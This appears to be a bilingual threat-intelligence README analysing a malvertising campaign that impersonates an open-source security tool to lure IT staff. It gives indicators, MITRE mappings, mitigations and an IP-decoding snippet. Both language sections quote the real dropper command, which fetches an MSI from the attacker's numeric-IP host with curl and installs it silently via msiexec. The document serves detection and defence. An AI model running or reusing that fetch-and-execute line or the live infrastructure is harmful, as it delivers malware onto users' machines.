# threat-intel-malvertising-analysis
Technical analysis and Threat Intelligence report on a targeted malvertising campaign leveraging social engineering (brand impersonation), curl, and silent msiexec droppers. / Análisis técnico e inteligencia de amenazas sobre campaña de malvertising y dropper silencioso.

# Threat Analysis: Targeted Malvertising Campaign & Social Engineering Impersonation (CyberPulse Dropper)
*Análisis de Amenazas: Campaña de Malvertising Dirigida y Suplantación por Ingeniería Social*

---

## 🇬🇧 English Version

### Executive Summary
An active malvertising campaign targeting cybersecurity and IT professionals has been identified. The campaign leverages sophisticated **social engineering and brand impersonation** techniques across social media and messaging apps, mimicking the promotion of a legitimate open-source tool ("CyberPulse") to trick victims into executing a console-based dropper that silently downloads an installer on Windows systems.

### Social Engineering Vector & Attack Tactic
1. **Brand Impersonation:** Attackers reuse or mimic legitimate posts from industry figures (a LinkedIn post from a CISO promoting an open-source Docker vulnerability aggregator).
2. **The Hook:** The message directly appeals to security analysts using phrases like: *"if you work in cybersecurity and want to try it, it's available on GitHub..."*.
3. **Malicious Redirection:** The shared link does not lead to the actual repository, but to an URL shortener and ad-redirection gateways (`inkd.in` / `tw-ch.com`) that lead to the attacker's infrastructure to deploy the payload.

### Infection Chain (Kill Chain)
Once the victim interacts with the infrastructure, a background command is executed on the OS:

```cmd
cmd /c curl.exe -fsL --ssl-no-revoke --retry 8 --retry-connrefused --retry-delay 1 --connect-timeout 20 -o "%TEMP%\S991.msi" [http://392073681/37620](http://392073681/37620) && msiexec /i "%TEMP%\S991.msi" /qn /norestart
```
#### Parameter Breakdown:
* **`curl.exe -fsL ...`**: Forced, silent download bypassing certificate validations (`--ssl-no-revoke`).
* **`-o "%TEMP%\S991.msi"`**: Stores the payload directly in the user's temp directory disguised as a Windows installer.
* **`msiexec /i ... /qn /norestart`**: Executes the package installation unattended (*Quiet No UI*) without user notification or immediate reboot requirements.

### Indicators of Compromise (IOCs)
* **Domains / Redirects:** `inkd.in/dCZGQfGV`, `tw-ch.com/79405727febbf278?...`
* **Download Infrastructure:** `http://23.94.145.209/37620` (Numeric IP converted from `392073681`)
* **Associated Files:** `S991.msi` (Dropped in `%TEMP%`)
* **MITRE ATT&CK Techniques:** 
  * **T1566.002:** Phishing (Spearphishing Link)
  * **T1204.002:** User Execution (Malicious File)
  * **T1105:** Ingress Tool Transfer
  * **T1072:** Software Deployment

### Mitigation & Recommendations
* Always verify that open-source repositories originate from the authors' official accounts, being wary of short links in messaging channels.
* Block traffic to IP `23.94.145.209` and associated domains at the perimeter.
* Audit anomalous usage of network utilities (`curl.exe`) writing installers (`.msi`) into temporary directories (`%TEMP%`).

## 🔬 Technical Appendix: Threat Intelligence Scripting

### EN: IP De-obfuscation Scripting
During the analysis of the campaign, obfuscated indicators (such as integer-encoded IP addresses) were normalized using Python's `ipaddress` library to extract the real malicious infrastructure.

```python
import ipaddress

# Decrypting/converting the integer-encoded IP to standard IPv4 format
ip_integer = 392073681
malicious_ip = ipaddress.ip_address(ip_integer)
print(f"Decoded Malicious IP: {malicious_ip}")  # Output: 23.94.145.209
```

## 🔗 Integration & Threat Intelligence Sharing

### EN: OTX Pulse & Automation
The indicators of compromise (IOCs) gathered during this investigation have been published to the open-source community via **AlienVault OTX**:
* **Pulse Reference:** [Threat Intel: Targeted Malvertising Campaign & MSI Dropper Analysis](https://otx.alienvault.com/pulse/6ae053c3148fa6f0b2992167) 

Additionally, the automated de-obfuscation script (`decoder.py`) provided in this repository was utilized to process and normalize the obfuscated infrastructure IP before submission.

---
## 🇪🇸 Versión en Español

### Resumen Ejecutivo
Se identificó una campaña activa de distribución de malware (*malvertising*) dirigida específicamente a profesionales de ciberseguridad y tecnología. La campaña utiliza técnicas sofisticadas de **ingeniería social y suplantación de identidad (*brand impersonation*)** en redes sociales y aplicaciones de mensajería, simulando la promoción de una herramienta de código abierto legítima ("CyberPulse") para inducir a las víctimas a ejecutar un *dropper* basado en consola que descarga un instalador silencioso en sistemas Windows.

### Vector de Ingeniería Social y Táctica de Ataque
1. **Suplantación de Identidad:** Los atacantes reutilizan o imitan publicaciones legítimas de referentes de la industria (un post de un CISO en LinkedIn promocionando una herramienta *open-source* de agregación de vulnerabilidades con Docker).
2. **El Gancho:** El mensaje apela directamente al interés de los analistas de seguridad con frases como: *"si trabajás en ciberseguridad y querés probarlo, está disponible en GitHub..."*.
3. **Redirección Maliciosa:** El enlace compartido no dirige al repositorio real, sino a un acortador y pasarelas de redirección publicitaria (`inkd.in` / `tw-ch.com`) que conducen a la infraestructura del atacante para desplegar el *payload*.

### Cadena de Infección (Kill Chain)
Una vez que la víctima interactúa con la infraestructura, se ejecuta un comando en segundo plano en el sistema operativo:

```cmd
cmd /c curl.exe -fsL --ssl-no-revoke --retry 8 --retry-connrefused --retry-delay 1 --connect-timeout 20 -o "%TEMP%\S991.msi" [http://392073681/37620](http://392073681/37620) && msiexec /i "%TEMP%\S991.msi" /qn /norestart
```

#### Desglose Técnico de Parámetros:
* **`curl.exe -fsL ...`**: Descarga forzada y silenciosa omitiendo validaciones de certificados (`--ssl-no-revoke`).
* **`-o "%TEMP%\S991.msi"`**: Almacena el *payload* directamente en la carpeta temporal del usuario bajo la apariencia de un instalador de Windows.
* **`msiexec /i ... /qn /norestart`**: Ejecuta la instalación del paquete de forma desatendida (*Quiet No UI*) y sin notificar al usuario ni requerir reinicios inmediatos.

### Indicadores de Compromiso (IOCs)
* **Dominios / Redirecciones:** `inkd.in/dCZGQfGV`, `tw-ch.com/79405727febbf278?...`
* **Infraestructura de Descarga:** `http://23.94.145.209/37620` (IP numérica convertida desde `392073681`)
* **Archivos asociados:** `S991.msi` (Generado en `%TEMP%`)
* **Técnicas MITRE ATT&CK:** 
  * **T1566.002:** Phishing (Spearphishing Link)
  * **T1204.002:** User Execution (Malicious File)
  * **T1105:** Ingress Tool Transfer
  * **T1072:** Software Deployment

### Mitigación y Recomendaciones
* Validar siempre que los repositorios *open-source* provengan de las cuentas oficiales de los autores, desconfiando de acortadores en canales de mensajería.
* Bloquear el tráfico hacia la IP `23.94.145.209` y dominios asociados en el perímetro.
* Auditar el uso anómalo de utilidades de red (`curl.exe`) escribiendo instaladores (`.msi`) en directorios temporales (`%TEMP%`).

## 🔬 Apéndice Técnico: Scripting de Inteligencia de Amenazas

### ES: Script de De-ofuscación de IP**
Durante el análisis de la campaña, los indicadores ofuscados (como direcciones IP codificadas en números enteros) fueron normalizados utilizando la biblioteca `ipaddress` de Python para extraer la infraestructura maliciosa real.

```python
import ipaddress

# Decodificando/convirtiendo la IP codificada en entero al formato estándar IPv4
ip_integer = 392073681
malicious_ip = ipaddress.ip_address(ip_integer)
print(f"IP Maliciosa Decodificada: {malicious_ip}")  # Resultado: 23.94.145.209
```

---
## 🔗 Integración y Compartición de Inteligencia de Amenazas

### ES: Publicación en OTX y Automatización
Los indicadores de compromiso (IOCs) recopilados durante esta investigación han sido publicados para la comunidad de código abierto a través de **AlienVault OTX**:
* **Referencia del Pulse:** [Threat Intel: Targeted Malvertising Campaign & MSI Dropper Analysis](https://otx.alienvault.com/pulse/6ae053c3148fa6f0b2992167)

Adicionalmente, el script de de-ofuscación automatizada (`decoder.py`) provisto en este repositorio fue utilizado para procesar y normalizar la IP de infraestructura ofuscada antes de su envío.
